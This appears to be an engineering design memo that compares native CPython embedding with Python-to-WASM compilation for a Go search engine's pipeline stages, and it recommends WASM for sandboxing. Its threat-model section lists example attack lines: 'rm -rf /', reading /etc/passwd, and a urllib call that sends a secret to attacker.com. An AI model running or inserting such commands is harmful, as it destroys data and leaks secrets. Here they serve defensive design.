# Python Execution Strategy Evaluation
## Date: January 27, 2026

## Executive Summary

**Recommendation**: **Python → WASM** (Option 2)

**Rationale**:
- We already have the compiler (pkg/wasm/python/)
- Consistent with Phase 2 architecture
- Better security and isolation
- Reuses existing WASM infrastructure
- Proven in Phase 2 with UDFs

---

## Option 1: Native Python Engine + Cython/CGO Interface

### Architecture
```
┌─────────────────────────────────────────┐
│  Go (Quidditch)                         │
│  ┌─────────────────────────────────┐   │
│  │  CGO Bridge                      │   │
│  └──────────┬──────────────────────┘   │
│             ↓                           │
│  ┌─────────────────────────────────┐   │
│  │  Cython Wrapper                  │   │
│  └──────────┬──────────────────────┘   │
└─────────────┼──────────────────────────┘
              ↓
   ┌──────────────────────────────────┐
   │  Native Python (CPython)          │
   │  • Full standard library          │
   │  • NumPy, pandas, ML libs         │
   │  • Direct memory access           │
   └──────────────────────────────────┘
```

### Pros ✅

1. **Full Python Ecosystem**
   - All stdlib modules available
   - NumPy, SciPy, pandas, scikit-learn work natively
   - No restrictions on libraries
   - Existing Python packages install via pip

2. **Performance**
   - Native execution speed
   - No WASM overhead (~5-10% faster)
   - C extensions work directly
   - JIT (PyPy) possible

3. **Development Experience**
   - Standard Python debugging tools (pdb, ipdb)
   - Familiar development workflow
   - IDE support fully functional
   - Standard error messages

4. **Integration Examples**
   - gopy: Go ↔ Python bindings
   - cgo + libpython: Direct embedding
   - go-python/gopy: Mature solutions exist

### Cons ❌

1. **Security Risks** ⚠️ CRITICAL
   - No sandboxing by default
   - Python code can access filesystem
   - Can import any module (os, subprocess, socket)
   - Can exhaust memory/CPU
   - Difficult to restrict capabilities
   - **Example exploit**: `import os; os.system('rm -rf /')`

2. **Isolation Issues**
   - Shared memory space with Go
   - GIL (Global Interpreter Lock) affects concurrency
   - Crashes can take down entire process
   - No memory limits per execution
   - Resource leaks harder to contain

3. **Deployment Complexity**
   - Must bundle Python runtime (~50MB)
   - Version compatibility issues (Python 3.9 vs 3.10 vs 3.11)
   - Platform-specific builds (glibc, musl, macOS, Windows)
   - Dependency hell (pip install failures)
   - Docker image size increases significantly

4. **Operational Overhead**
   - Python process lifecycle management
   - GC tuning conflicts (Go vs Python)
   - Memory profiling more complex
   - Harder to debug race conditions
   - CGO disables some Go optimizations

5. **Maintenance Burden**
   - Need to maintain Cython wrapper code
   - CGO can be fragile (pointer passing, memory management)
   - Python API changes across versions
   - Another language in the stack

### Implementation Complexity: **HIGH** (8-10 days)

**Files to create**:
- pkg/python/bridge/cpython.go (CGO wrapper)
- pkg/python/bridge/cpython.pyx (Cython wrapper)
- pkg/python/runtime.go (Python lifecycle)
- pkg/python/security.go (Sandboxing attempts)
- setup.py, requirements.txt
- Platform-specific build scripts

---

## Option 2: Python → WASM (Existing Compiler)

### Architecture
```
┌─────────────────────────────────────────┐
│  Go (Quidditch)                         │
│  ┌─────────────────────────────────┐   │
│  │  WASM Runtime (wazero)           │   │
│  │  • JIT compilation               │   │
│  │  • Memory limits                 │   │
│  │  • Sandboxed execution           │   │
│  └──────────┬──────────────────────┘   │
└─────────────┼──────────────────────────┘
              ↓
   ┌──────────────────────────────────┐
   │  WASM Module                      │
   │  • Compiled Python code           │
   │  • MicroPython or Pyodide         │
   │  • Host function imports          │
   └──────────────────────────────────┘

Compilation (offline):
Python (.py) → MicroPython/Pyodide → WASM (.wasm)
```

### Pros ✅

1. **Security & Isolation** ⭐ CRITICAL ADVANTAGE
   - Complete sandboxing (no filesystem, network, process access)
   - Memory limits enforced (e.g., 16MB max)
   - CPU time limits via context timeout
   - Capability-based security (explicit host function imports)
   - No access to Go runtime internals
   - **Exploit impossible**: Can't break out of sandbox

2. **Consistency**
   - Same architecture as Phase 2 UDFs
   - Reuses existing WASM runtime (pkg/wasm/)
   - Unified security model
   - Single execution path
   - Easier to reason about

3. **Deployment Simplicity**
   - WASM modules are portable binaries
   - No Python runtime to bundle
   - Single binary deployment
   - Works same on all platforms
   - No dependency installation needed

4. **Resource Management**
   - Per-module memory limits
   - Automatic cleanup on completion
   - No memory leaks (WASM memory is isolated)
   - Predictable performance
   - Can run thousands concurrently

5. **Already Implemented**
   - Compiler exists: pkg/wasm/python/compiler.go
   - Host functions exist: pkg/wasm/hostfunctions.go
   - Examples work: examples/udfs/python-filter/
   - Testing infrastructure ready
   - **We already paid the implementation cost!**

### Cons ❌

1. **Limited Standard Library**
   - MicroPython: Python 3.4 syntax, minimal stdlib
   - Pyodide: Full stdlib but 15MB+ binary
   - Some modules unavailable (threading, subprocess, etc.)
   - C extensions need WASM compilation

2. **Performance Overhead**
   - WASM interpretation: ~5-15% slower than native
   - Initial compilation time
   - No JIT in some WASM runtimes
   - Function call overhead (Go ↔ WASM)

3. **Development Experience**
   - Debugging is harder (WASM debugging tools less mature)
   - Error messages less helpful
   - Can't use standard pdb
   - IDE support limited for WASM target

4. **Library Ecosystem**
   - Need WASM-compiled versions
   - Not all Python packages available
   - ML libraries (TensorFlow, PyTorch) very large or unavailable
   - May need pure-Python alternatives

### Implementation Complexity: **LOW** (1-2 days)

**Files to modify** (not create):
- pkg/coordination/pipeline/stages/python_stage.go (adapter to existing WASM)
- examples/pipelines/*/pipeline.json (configuration)

**Already exists**:
- ✅ Compiler: pkg/wasm/python/compiler.go
- ✅ Host functions: pkg/wasm/hostfunctions.go
- ✅ WASM runtime: pkg/wasm/runtime.go
- ✅ Registry: pkg/wasm/registry.go

---

## Detailed Comparison

| Criterion | Native Python + Cython | Python → WASM | Winner |
|-----------|------------------------|---------------|---------|
| **Security** | ⚠️ Weak (no sandbox) | ✅ Strong (full sandbox) | **WASM** |
| **Isolation** | ❌ Shared memory | ✅ Isolated memory | **WASM** |
| **Deployment** | ❌ Complex (bundle runtime) | ✅ Simple (single binary) | **WASM** |
| **Performance** | ✅ Native speed | ⚠️ 5-15% slower | Native |
| **Std Library** | ✅ Full access | ⚠️ Limited | Native |
| **ML Libraries** | ✅ All available | ❌ Limited | Native |
| **Resource Limits** | ⚠️ Hard to enforce | ✅ Built-in | **WASM** |
| **Consistency** | ❌ New architecture | ✅ Reuses Phase 2 | **WASM** |
| **Impl. Time** | ❌ 8-10 days | ✅ 1-2 days | **WASM** |
| **Maintenance** | ❌ High (CGO, Cython) | ✅ Low (pure Go) | **WASM** |
| **Debugging** | ✅ Standard tools | ⚠️ Limited tools | Native |
| **Already Built** | ❌ No | ✅ Yes (Phase 2!) | **WASM** |

**Score**: WASM wins 8/12 categories (with critical ones: security, isolation, deployment)

---

## Hybrid Approach (Future)

**Phase 3 (Now)**: Use WASM for all pipelines
- Leverages existing infrastructure
- Secure and isolated
- Fast to implement

**Phase 4 (Future)**: Add native Python option for power users
- Opt-in for trusted environments
- ML workloads needing full ecosystem
- Admin can enable via config: `allow_native_python: true`
- Requires explicit security acknowledgment

---

## Real-World Use Cases Analysis

### Use Case 1: Synonym Expansion
**Requirements**: Dictionary lookup, query rewriting
**Best Option**: ✅ **WASM** - Simple text processing, no complex dependencies

### Use Case 2: Spell Correction
**Requirements**: Edit distance, dictionary matching
**Best Option**: ✅ **WASM** - Pure Python algorithms sufficient

### Use Case 3: ML Re-ranking
**Requirements**: ONNX model inference
**Best Option**: ⚠️ **Either**
- WASM: Use ONNX Runtime WASM build (exists!)
- Native: Use full onnxruntime-python

**For Phase 3**: Start with WASM + ONNX WASM build

### Use Case 4: Text Embeddings (Sentence Transformers)
**Requirements**: BERT/transformers model
**Best Option**: ⚠️ **Native preferred** - Large models, complex dependencies
**For Phase 3**: Document as "future enhancement" or use remote API

### Use Case 5: Query Understanding (NER, Intent)
**Requirements**: spaCy or simple rule-based
**Best Option**: ✅ **WASM** - Rule-based works fine, spaCy can use lite models

---

## Security Analysis (Critical)

### Attack Vectors: Native Python

1. **Filesystem Access**
   ```python
   import os
   os.system("cat /etc/passwd")
   os.remove("/important/file")
   ```

2. **Network Access**
   ```python
   import urllib.request
   urllib.request.urlopen("http://attacker.com/?data=" + secret)
   ```

3. **Resource Exhaustion**
   ```python
   while True:
       x = [0] * 1000000  # Exhaust memory
   ```

4. **Subprocess Execution**
   ```python
   import subprocess
   subprocess.run(["rm", "-rf", "/"])
   ```

5. **Module Tampering**
   ```python
   import sys
   sys.modules['important'] = malicious_module
   ```

**Mitigations**: Complex sandboxing (RestrictedPython, PyPy sandboxing) - brittle and easy to bypass

### Attack Vectors: WASM

**All of the above**: ✅ **IMPOSSIBLE** - No access to OS, filesystem, network, or Go runtime

Only attack vector: Resource exhaustion (memory/CPU) - but we have **built-in limits**:
```go
// In runtime.go
MaxMemoryPages: 256,  // 16MB max
ExecutionTimeout: 5 * time.Second,
```

---

## Recommendation: Python → WASM

### Decision Criteria

**Must-haves** (all satisfied by WASM):
1. ✅ Secure execution (sandbox required)
2. ✅ Resource limits (memory, CPU)
3. ✅ Works in production (no trust issues)
4. ✅ Fast implementation (leverage Phase 2 work)
5. ✅ Maintainable (pure Go, no CGO)

**Nice-to-haves** (partially satisfied):
1. ⚠️ Full Python stdlib (MicroPython has subset, Pyodide has full)
2. ⚠️ Native performance (5-15% overhead acceptable)
3. ❌ Complex ML libraries (workaround: remote inference or ONNX)

### Implementation Path

**Phase 3 (Now) - WASM**:
1. Implement pipeline framework in Go (1 day)
2. Create Python stage adapter to WASM (0.5 days)
3. Build example pipelines:
   - Synonym expansion (pure Python)
   - Spell correction (pure Python)
   - ML re-ranking (ONNX WASM)
4. Documentation and testing (0.5 days)

**Total**: 2-3 days

**Phase 4+ (Future) - Optional Native Python**:
- Add as opt-in feature for trusted environments
- Requires admin configuration
- Document security implications
- Provide best practices guide

---

## Technical Details: WASM Python Options

### Option A: MicroPython WASM ⭐ RECOMMENDED
**Size**: ~500KB WASM binary
**Python Version**: 3.4 syntax
**Stdlib**: Basic (no threading, no C extensions)
**Performance**: Good (optimized for embedded)
**Compilation**: Fast
**Use Case**: Text processing, simple algorithms

### Option B: Pyodide
**Size**: ~15MB WASM binary
**Python Version**: 3.11
**Stdlib**: Full CPython stdlib
**Performance**: Slower (interpreter overhead)
**Compilation**: Slow (first load)
**Use Case**: When full stdlib needed

### Option C: Rust-CPython + WASM
**Size**: ~2-3MB
**Python Version**: 3.x
**Stdlib**: Partial
**Performance**: Better than Pyodide
**Compilation**: Medium
**Use Case**: Balance between size and features

**For Phase 3**: Start with **MicroPython WASM**
- Smallest binary
- Fastest compilation
- Sufficient for example pipelines
- Can add Pyodide later if needed

---

## Conclusion

**Decision**: **Python → WASM**

**Justification**:
1. **Security is non-negotiable** - Production search engines can't run untrusted native Python
2. **We already built it** - Phase 2 delivered the compiler and runtime
3. **Faster to market** - 2-3 days vs 8-10 days
4. **Consistent architecture** - Same as UDFs, easier to maintain
5. **Good enough for 90% of use cases** - Synonym expansion, spell-check, basic ML all work

**Trade-off acknowledged**: Advanced ML (transformers, large models) will need workarounds:
- Remote inference API
- ONNX WASM builds
- Pre-computed embeddings

**Future path**: Add native Python as Phase 4+ opt-in feature with proper security documentation.

---

## Next Steps

1. ✅ Accept this recommendation
2. Create implementation tasks for pipeline framework (WASM-based)
3. Build 3 example pipelines using MicroPython WASM
4. Document limitations and workarounds
5. Plan Phase 4 native Python support (if needed)
